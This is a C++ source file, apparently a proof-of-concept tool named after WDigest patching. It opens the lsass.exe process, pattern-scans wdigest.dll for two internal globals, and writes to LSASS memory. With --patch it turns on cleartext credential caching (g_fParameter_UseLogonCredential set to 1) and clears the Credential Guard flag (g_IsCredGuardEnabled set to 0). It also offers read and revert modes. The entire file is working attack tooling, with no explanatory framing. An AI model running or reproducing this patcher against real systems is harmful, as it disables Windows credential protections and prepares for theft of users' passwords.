#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#define PATTERN_SIZE 12

typedef struct _WDIGEST_PATCH_POC
{
    PVOID BaseAddress;
    DWORD CodeOffset;
    DWORD UseLogonCredentialOffset;
    DWORD IsCredGuardEnabledOffset;
    DWORD64 UseLogonCredentialAddress;
    DWORD64 IsCredGuardEnabledAddress;
} WDIGEST_PATCH_POC, * PWDIGEST_PATCH_POC;

BOOL FindVariableOffsets(PWDIGEST_PATCH_POC pWdigestStruct);
BOOL FindBaseAddress(PWDIGEST_PATCH_POC pWdigestStruct);
BOOL CalculateVirtualAddresses(PWDIGEST_PATCH_POC pWdigestStruct);
BOOL ReadMemoryAddress(HANDLE hProcess, DWORD64 Address, PDWORD Value);
BOOL WriteMemoryAddress(HANDLE hProcess, DWORD64 Address, DWORD Value);
DWORD GetLsassPid();
BOOL PatchWdigest(HANDLE hLsass, PWDIGEST_PATCH_POC pWdigestStruct, bool clean, bool readOnly);

int wmain(int argc, wchar_t* argv[])
{
    WDIGEST_PATCH_POC WdigestStruct;
    ZeroMemory(&WdigestStruct, sizeof(WdigestStruct));

    if (argc < 2)
    {
        wprintf(L"Usage: %s --read|--patch|--clean\n", argv[0]);
        return 1;
    }

    bool readOnly = false;
    bool clean = false;

    if (_wcsicmp(argv[1], L"--read") == 0)
    {
        readOnly = true;
    }
    else if (_wcsicmp(argv[1], L"--patch") == 0)
    {
        readOnly = false;
    }
    else if (_wcsicmp(argv[1], L"--clean") == 0)
    {
        clean = true;
    }
    else
    {
        wprintf(L"Invalid option: %s\n", argv[1]);
        return 1;
    }

    DWORD lsassPid = GetLsassPid();
    if (lsassPid == 0)
    {
        wprintf(L"[-] Failed to find lsass.exe process.\n");
        return 1;
    }

    HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (hLsass == NULL)
    {
        wprintf(L"[-] Failed to open handle to lsass.exe process. Error: %lu\n", GetLastError());
        return 1;
    }

    if (!FindVariableOffsets(&WdigestStruct))
    {
        wprintf(L"Failed to find variable offsets.\n");
        CloseHandle(hLsass);
        return 1;
    }

    wprintf(L"[+] Offset of g_fParameter_UseLogonCredential: 0x%08x\r\n", WdigestStruct.UseLogonCredentialOffset);
    wprintf(L"[+] Offset of g_IsCredGuardEnabled: 0x%08x\r\n", WdigestStruct.IsCredGuardEnabledOffset);

    if (!FindBaseAddress(&WdigestStruct))
    {
        wprintf(L"Failed to find base address of wdigest.dll.\n");
        CloseHandle(hLsass);
        return 1;
    }

    wprintf(L"[+] Base address of wdigest.dll: 0x%016p\r\n", WdigestStruct.BaseAddress);

    if (!CalculateVirtualAddresses(&WdigestStruct))
    {
        wprintf(L"[-] Failed to calculate virtual addresses.\n");
        CloseHandle(hLsass);
        return 1;
    }

    if (!PatchWdigest(hLsass, &WdigestStruct, clean, readOnly))
    {
        wprintf(L"[-] Failed to patch wdigest values.\n");
    }

    CloseHandle(hLsass);
    return 0;
}

BOOL FindBaseAddress(PWDIGEST_PATCH_POC pWdigestStruct)
{
    HMODULE hModule = NULL;

    if ((hModule = LoadLibraryW(L"wdigest.dll")))
    {
        pWdigestStruct->BaseAddress = hModule;
        FreeLibrary(hModule);
        return TRUE;
    }

    return FALSE;
}

BOOL FindVariableOffsets(PWDIGEST_PATCH_POC pWdigestStruct)
{
    BOOL bResult = FALSE, bMatch;
    LPCWSTR pwszWdigestName = L"C:\\Windows\\System32\\wdigest.dll";
    HANDLE hFile = NULL;
    PBYTE pBuffer = NULL, pTextSection = NULL;
    IMAGE_DOS_HEADER DosHeader;
    IMAGE_NT_HEADERS NtHeaders;
    IMAGE_SECTION_HEADER SectionHeader;
    DWORD i, j, dwSectionOffset, dwMatchCount = 0, dwCodeOffset, dwUseLogonCredentialOffset, dwIsCredGuardEnabledOffset;
    const DWORD dwBufferSize = 1024;
    BYTE Code[PATTERN_SIZE];

    // Allocate a buffer that we will use to read data from wdigest.dll.
    if (!(pBuffer = (PBYTE)LocalAlloc(LPTR, dwBufferSize)))
        goto cleanup;

    hFile = CreateFileW(pwszWdigestName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        goto cleanup;

    // Read DOS and NT headers from the PE file.
    if (!ReadFile(hFile, pBuffer, dwBufferSize, NULL, NULL))
        goto cleanup;

    RtlMoveMemory(&DosHeader, pBuffer, sizeof(DosHeader));
    RtlMoveMemory(&NtHeaders, pBuffer + DosHeader.e_lfanew, sizeof(NtHeaders));

    if (NtHeaders.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64)
    {
        wprintf(L"[-] Unsupported architecture: 0x%04x\r\n", NtHeaders.FileHeader.Machine);
        goto cleanup;
    }

    // Iterate the PE's section headers.
    for (i = 0; i < NtHeaders.FileHeader.NumberOfSections; i++)
    {
        dwSectionOffset = DosHeader.e_lfanew + sizeof(NtHeaders) + i * sizeof(SectionHeader);
        SetFilePointer(hFile, dwSectionOffset, NULL, FILE_BEGIN);
        if (!ReadFile(hFile, pBuffer, sizeof(IMAGE_SECTION_HEADER), NULL, NULL))
            break;
        RtlMoveMemory(&SectionHeader, pBuffer, sizeof(SectionHeader));

        // Stop when we reach the .text section.
        if (!strcmp((char*)SectionHeader.Name, ".text"))
        {
            // Store the content of the .text section in a buffer.
            if (!(pTextSection = (PBYTE)LocalAlloc(LPTR, SectionHeader.SizeOfRawData)))
                break;

            SetFilePointer(hFile, SectionHeader.PointerToRawData, NULL, FILE_BEGIN);
            if (!ReadFile(hFile, pTextSection, SectionHeader.SizeOfRawData, NULL, NULL))
                break;

            // Search for the pattern.
            j = 0;
            while (j < SectionHeader.SizeOfRawData)
            {
                if ((j + PATTERN_SIZE) >= SectionHeader.SizeOfRawData)
                    break;

                if (pTextSection[j] == 0x39)
                {
                    bMatch = (pTextSection[j + 5] == 0x00) && (pTextSection[j + 6] == 0x8b) && (pTextSection[j + 11] == 0x00);

                    if (bMatch)
                    {
                        dwCodeOffset = SectionHeader.VirtualAddress + j;
                        RtlMoveMemory(Code, &pTextSection[j], PATTERN_SIZE);
                        dwMatchCount++;
                    }
                }

                j++;
            }

            break;
        }
    }

    if (dwMatchCount != 1)
    {
        wprintf(L"[-] Pattern not matched (or more than once): %d\r\n", dwMatchCount);
        goto cleanup;
    }

    wprintf(L"[+] Matched code at 0x%08x: ", dwCodeOffset);
    for (i = 0; i < sizeof(Code); i++)
        wprintf(L"%02x ", Code[i]);
    wprintf(L"\r\n");

    // Extract the RIP-relative offsets and calculate the absolute offset of each global variable.
    RtlMoveMemory(&dwUseLogonCredentialOffset, &Code[2], sizeof(dwUseLogonCredentialOffset));
    RtlMoveMemory(&dwIsCredGuardEnabledOffset, &Code[8], sizeof(dwIsCredGuardEnabledOffset));
    dwUseLogonCredentialOffset += 6 + dwCodeOffset;
    dwIsCredGuardEnabledOffset += 6 + 6 + dwCodeOffset;

    pWdigestStruct->CodeOffset = dwCodeOffset;
    pWdigestStruct->UseLogonCredentialOffset = dwUseLogonCredentialOffset;
    pWdigestStruct->IsCredGuardEnabledOffset = dwIsCredGuardEnabledOffset;

    bResult = TRUE;

cleanup:
    if (hFile)
        CloseHandle(hFile);
    if (pBuffer)
        LocalFree(pBuffer);
    if (pTextSection)
        LocalFree(pTextSection);

    return bResult;
}

BOOL CalculateVirtualAddresses(PWDIGEST_PATCH_POC pWdigestStruct)
{
    if (!pWdigestStruct || !pWdigestStruct->BaseAddress || !pWdigestStruct->UseLogonCredentialOffset || !pWdigestStruct->IsCredGuardEnabledOffset)
        return FALSE;

    pWdigestStruct->UseLogonCredentialAddress = (DWORD64)pWdigestStruct->BaseAddress + pWdigestStruct->UseLogonCredentialOffset;
    pWdigestStruct->IsCredGuardEnabledAddress = (DWORD64)pWdigestStruct->BaseAddress + pWdigestStruct->IsCredGuardEnabledOffset;

    return TRUE;
}

BOOL ReadMemoryAddress(HANDLE hProcess, DWORD64 Address, PDWORD Value)
{
    SIZE_T bytesRead;
    return ReadProcessMemory(hProcess, (LPCVOID)Address, Value, sizeof(DWORD), &bytesRead) && bytesRead == sizeof(DWORD);
}

BOOL WriteMemoryAddress(HANDLE hProcess, DWORD64 Address, DWORD Value)
{
    SIZE_T bytesWritten;
    return WriteProcessMemory(hProcess, (LPVOID)Address, &Value, sizeof(DWORD), &bytesWritten) && bytesWritten == sizeof(DWORD);
}

DWORD GetLsassPid()
{
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32))
        {
            do
            {
                if (_wcsicmp(pe32.szExeFile, L"lsass.exe") == 0)
                {
                    lsassPid = pe32.th32ProcessID;
                    wprintf(L"[+] Found lsass.exe PID: %lu\n", lsassPid);
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return lsassPid;
}

BOOL PatchWdigest(HANDLE hLsass, PWDIGEST_PATCH_POC pWdigestStruct, bool clean, bool readOnly)
{
    // Read the value of g_fParameter_UseLogonCredential
    DWORD useLogonCredentialValue = 0;
    if (ReadMemoryAddress(hLsass, pWdigestStruct->UseLogonCredentialAddress, &useLogonCredentialValue))
    {
        wprintf(L"\t[+] Value of g_fParameter_UseLogonCredential: 0x%08x\r\n", useLogonCredentialValue);
        if (!readOnly)
        {
            if (clean)
            {
                if (useLogonCredentialValue == 1)
                {
                    wprintf(L"\t\t[+] Wdigest is enabled. Reverting...\r\n");
                    if (WriteMemoryAddress(hLsass, pWdigestStruct->UseLogonCredentialAddress, 0))
                        wprintf(L"\t\t[+] Successfully reverted g_fParameter_UseLogonCredential to 0.\r\n");
                    else
                        wprintf(L"\t\t[-] Failed to revert g_fParameter_UseLogonCredential. Error: %lu\r\n", GetLastError());
                }
                else
                {
                    wprintf(L"\t\t[+] Wdigest is already disabled.\r\n");
                }
            }
            else
            {
                if (useLogonCredentialValue == 0)
                {
                    wprintf(L"\t\t[+] Wdigest is not enabled. Patching it...\r\n");
                    if (WriteMemoryAddress(hLsass, pWdigestStruct->UseLogonCredentialAddress, 1))
                    {
                        wprintf(L"\t\t[+] Successfully patched g_fParameter_UseLogonCredential to 1.\r\n");
                        if (ReadMemoryAddress(hLsass, pWdigestStruct->UseLogonCredentialAddress, &useLogonCredentialValue))
                            wprintf(L"\t\t[+] Verified value of g_fParameter_UseLogonCredential: 0x%08x\r\n", useLogonCredentialValue);
                        else
                            wprintf(L"\t\t[-] Failed to read the value of g_fParameter_UseLogonCredential. Error: %lu\r\n", GetLastError());
                    }
                    else
                        wprintf(L"\t\t[-] Failed to patch g_fParameter_UseLogonCredential. Error: %lu\r\n", GetLastError());
                }
                else if (useLogonCredentialValue == 1)
                {
                    wprintf(L"\t\t[+] Wdigest is already enabled.\r\n");
                }
            }
        }
    }
    else
    {
        wprintf(L"\t[-] Failed to read the value of g_fParameter_UseLogonCredential. Error: %lu\r\n", GetLastError());
        return FALSE;
    }

    // Read the value of g_IsCredGuardEnabled
    DWORD isCredGuardEnabledValue = 0;
    if (ReadMemoryAddress(hLsass, pWdigestStruct->IsCredGuardEnabledAddress, &isCredGuardEnabledValue))
    {
        wprintf(L"\t[+] Value of g_IsCredGuardEnabled: 0x%08x\r\n", isCredGuardEnabledValue);
        if (!readOnly)
        {
            if (clean)
            {
                if (isCredGuardEnabledValue == 0)
                {
                    wprintf(L"\t\t[+] Credential Guard is disabled. Reverting...\r\n");
                    if (WriteMemoryAddress(hLsass, pWdigestStruct->IsCredGuardEnabledAddress, 1))
                        wprintf(L"\t\t[+] Successfully reverted g_IsCredGuardEnabled to 1.\r\n");
                    else
                        wprintf(L"\t\t[-] Failed to revert g_IsCredGuardEnabled. Error: %lu\r\n", GetLastError());
                }
                else
                {
                    wprintf(L"\t\t[+] Credential Guard is already enabled.\r\n");
                }
            }
            else
            {
                if (isCredGuardEnabledValue == 1)
                {
                    wprintf(L"\t\t[+] Credential Guard is enabled. Patching it...\r\n");
                    if (WriteMemoryAddress(hLsass, pWdigestStruct->IsCredGuardEnabledAddress, 0))
                    {
                        wprintf(L"\t\t[+] Successfully patched g_IsCredGuardEnabled to 0.\r\n");
                        if (ReadMemoryAddress(hLsass, pWdigestStruct->IsCredGuardEnabledAddress, &isCredGuardEnabledValue))
                            wprintf(L"\t\t[+] Verified value of g_IsCredGuardEnabled: 0x%08x\r\n", isCredGuardEnabledValue);
                        else
                            wprintf(L"\t\t[-] Failed to read the value of g_IsCredGuardEnabled. Error: %lu\r\n", GetLastError());
                    }
                    else
                        wprintf(L"\t\t[-] Failed to patch g_IsCredGuardEnabled. Error: %lu\r\n", GetLastError());
                }
                else if (isCredGuardEnabledValue == 0)
                {
                    wprintf(L"\t\t[+] Credential Guard is already disabled.\r\n");
                }
            }
        }
    }
    else
    {
        wprintf(L"\t[-] Failed to read the value of g_IsCredGuardEnabled. Error: %lu\r\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}